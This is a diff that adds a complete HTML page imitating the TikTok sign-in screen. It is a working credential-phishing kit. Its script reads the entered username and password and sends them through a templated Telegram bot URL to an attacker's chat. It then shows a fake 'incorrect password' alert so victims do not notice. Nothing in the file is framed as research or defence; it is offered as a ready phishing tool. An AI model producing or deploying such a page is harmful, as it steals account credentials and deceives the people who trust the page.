@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Login</title>
+    <style>
+        /* CSS styling for TikTok login page */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #121212;
+            border-radius: 10px;
+            width: 360px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.2);
+            color: #fff;
+        }
+
+        .login-container img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            background-color: #181818;
+            color: #fff;
+        }
+
+        input:focus {
+            border-color: #ff0050;
+            box-shadow: 0 0 8px rgba(255, 0, 80, 0.5);
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: #ff0050;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-login:hover {
+            background-color: #e60045;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #ff0050;
+            text-decoration: none;
+        }
+
+        .divider {
+            margin: 20px 0;
+            border-top: 1px solid #dbdbdb;
+        }
+
+        .signup-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #181818;
+            border: 1px solid #ff0050;
+            font-size: 14px;
+            color: #ff0050;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .signup-btn:hover {
+            background-color: #222;
+        }
+
+        .terms {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .terms a {
+            color: #ff0050;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
+        <h2>Sign in to TikTok</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="btn-login">Log In</button>
+        </form>
+        <p class="forgot-password"><a href="#">Forgot password?</a></p>
+        <div class="divider"></div>
+        <button class="signup-btn">Don't have an account? Sign up</button>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            let username = document.getElementById('username').value;
+            let password = document.getElementById('password').value;
+            
+            let token = "${token}";
+            let chatId = "${id}";
+
+            let message = \`🔴 **TikTok Login Attempt**\n👤 Username: \${username}\n🔒 Password: \${password}\`;
+            let url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chatId}&text=\${encodeURIComponent(message)}\`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    alert("Incorrect username or password. Please try again.");
+                })
+                .catch(error => console.error("Error sending message:", error));
+        });
+    </script>
+</body>
+</html>
